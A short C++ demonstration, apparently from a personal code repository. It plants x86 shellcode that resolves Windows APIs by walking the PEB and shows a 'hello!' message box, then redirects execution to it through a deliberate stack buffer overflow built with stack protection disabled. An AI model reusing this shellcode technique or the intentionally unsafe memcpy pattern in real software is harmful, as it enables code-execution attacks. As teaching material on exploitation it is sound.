// from shellcode.cpp ( https://github.com/i-saint/scribble/blob/master/shellcode.cpp )
#pragma section(".shellcode", execute)
__declspec(allocate(".shellcode")) char shellcode[] = "\x55\x8B\xEC\x83\xEC\x34\x53\x56\x57\xC7\x45\xD8\x75\x73\x65\x72\xC7\x45\xDC\x33\x32\x2E\x64\xC7\x45\xE0\x6C\x6C\x00\x00\xC7\x45\xCC\x4D\x65\x73\x73\xC7\x45\xD0\x61\x67\x65\x42\xC7\x45\xD4\x6F\x78\x41\x00\xC7\x45\xE4\x68\x65\x6C\x6C\xC7\x45\xE8\x6F\x21\x00\x00\x33\xC9\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x46\x08\x8B\x7E\x20\x8B\x36\x38\x4F\x18\x75\xF3\x89\x45\xF8\x8B\x5D\xF8\x8B\x43\x3C\x83\x65\xFC\x00\x03\xC3\x0F\xB7\x48\x14\x8D\x4C\x01\x18\x8B\x40\x78\x2B\x41\x0C\x03\x41\x14\x03\xC3\x8B\x48\x20\x8B\x50\x24\x8B\x70\x1C\x8B\x40\x14\x03\xCB\x03\xD3\x03\xF3\x89\x45\xF4\x85\xC0\x74\x4C\xEB\x03\x8B\x5D\xF8\x8B\x45\xFC\x8B\x3C\x81\x0F\xB7\x04\x42\x03\xFB\x8B\x1C\x86\x8B\x07\x03\x5D\xF8\x3D\x4C\x6F\x61\x64\x75\x0E\x81\x7F\x08\x61\x72\x79\x41\x75\x05\x89\x5D\xF0\xEB\x13\x3D\x47\x65\x74\x50\x75\x0C\x81\x7F\x08\x64\x64\x72\x65\x75\x03\x89\x5D\xEC\xFF\x45\xFC\x8B\x45\xFC\x3B\x45\xF4\x72\xB6\x8D\x45\xD8\x50\xFF\x55\xF0\x8D\x4D\xCC\x51\x50\xFF\x55\xEC\x6A\x00\x8D\x4D\xE4\x51\x51\x6A\x00\xFF\xD0\x5F\x5E\x5B\xC9\xC3";

#include <cstring>
void vulnerable(char *data, size_t size)
{
    char buf[0x10];
    memcpy(buf, data, size);
}

int main()
{
    char data[0x18];
    *(void**)(&data[0x14]) = shellcode;
    vulnerable(data, sizeof(data)); // main() -> vulnerable() -> shellcode
}
// cl /Zi /GS- buffer_overflow.cpp
